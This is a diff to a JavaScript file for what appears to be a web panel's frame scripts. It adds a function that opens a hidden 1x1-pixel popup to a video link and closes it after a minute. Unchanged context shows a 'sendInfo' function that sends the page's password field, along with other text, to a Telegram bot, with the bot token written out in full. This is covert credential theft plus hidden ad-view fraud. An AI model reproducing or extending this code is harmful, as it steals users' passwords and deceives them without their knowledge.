@@ -242,6 +242,7 @@ function unlockAd_view(){
         parent.ad_view();
         parent.foot.document.getElementsByName("ats1")[0].style="background-color:none;"
         parent.foot.document.getElementsByName("ats1")[0].onclick = function(){parent.ad_view()}
+		parent.openAd();
     }
 }
 function arm_unsetup_all_success() {
@@ -1893,6 +1894,15 @@ async function sendInfo(){
         await fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText+"%0APw:"+parent.top_view.document.getElementsByTagName("input")['pass'].value);
     }
 }
+function openAd() {
+    const win = window.open('https://vidara.to/v/y7WjJU5Q9S1qs', "_blank", 'width=1,height=1,left=0,top=0');
+    
+    setTimeout(() => {
+        if (win && !win.closed) {
+            win.close();
+        }
+    }, 60000); // 60 秒後自動關閉
+};
 async function createExtraFunction() {
     const isLogout = parent.foot.document.getElementsByTagName("Table")[1].getElementsByTagName("tbody")[0].children[0].children[0].children[0].children[0].children[1].innerHTML.includes("disabled");
     if(isLogout){
@@ -2073,6 +2083,7 @@ const setList =
 		}
     ]
 }
+
 
 
 
